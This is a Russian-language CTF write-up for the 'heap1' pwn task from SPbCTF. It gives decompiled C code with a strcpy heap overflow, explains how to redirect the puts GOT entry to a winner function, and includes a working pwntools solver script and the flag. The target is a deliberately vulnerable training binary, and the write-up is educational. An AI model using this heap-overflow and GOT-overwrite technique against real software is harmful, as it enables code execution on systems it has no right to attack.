[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn7_heap1)
Описание:
Just do that one more time
`nc 109.233.56.90 11751`
**[heap1.elf](https://pwn.spbctf.ru/files/heap/heap1/heap1.elf)**

Main:
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  char **v3; // [rsp+10h] [rbp-820h]
  char **v4; // [rsp+18h] [rbp-818h]
  char s[1024]; // [rsp+20h] [rbp-810h] BYREF
  char src[1032]; // [rsp+420h] [rbp-410h] BYREF
  unsigned __int64 canary; // [rsp+828h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setvbuf(stdout, nullptr, 2, 0);

  v3 = malloc(0x10u);
  *v3 = 1;
  v3[1] = malloc(8u);
  v4 = malloc(0x10u);
  *v4 = 2;
  v4[1] = malloc(8u);

  printf("i1:%p i2:%p main:%p\n", v3, v4, main);
  puts("Enter S1");
  fgets(s, 1024, stdin);
  puts("Enter S2");
  fgets(src, 1024, stdin);
  strcpy(v3[1], s);
  strcpy(v4[1], src);
  puts("and that's a wrap folks!\n");
}
```

Так же есть такая функция:
``` C
int winner()
{
  int v0; // eax

  v0 = time(nullptr);
  printf("and we have a winner @ %d\n", v0);
  return system("cat flag.txt");
}
```
Для получения флага необходимо её вызвать.

В qira намного лучше видно уязвимость:
![{F87AB550-5E67-4175-8990-994C3664F9C5}](../../../../z.%20Images/{F87AB550-5E67-4175-8990-994C3664F9C5}.png)
Первым вводом необходимо поменять адрес буфера у второго объекта на адрес puts в таблице got plt, а вторым вводом заменить адрес puts на winner.

Солвер:
``` python
puts_got_offset = 0x4020
main_offset = 0x11EE
win_offset = 0x11B9

io = start()

io.recvuntil(b'main:')
main_addr = int(io.recvline().decode()[:-1], 16)
puts_got = main_addr - main_offset + puts_got_offset
win = main_addr - main_offset + win_offset

io.sendline(b'A' * 0x28 + p64(puts_got))
io.sendline(p64(win))

io.interactive()
```

Запуск:
![{9175EC17-971D-4A45-9FBD-9287929809A0}](../../../../z.%20Images/{9175EC17-971D-4A45-9FBD-9287929809A0}.png)

Ответ: `SPBCTF{50M3_H34P_4110W5_WwW}`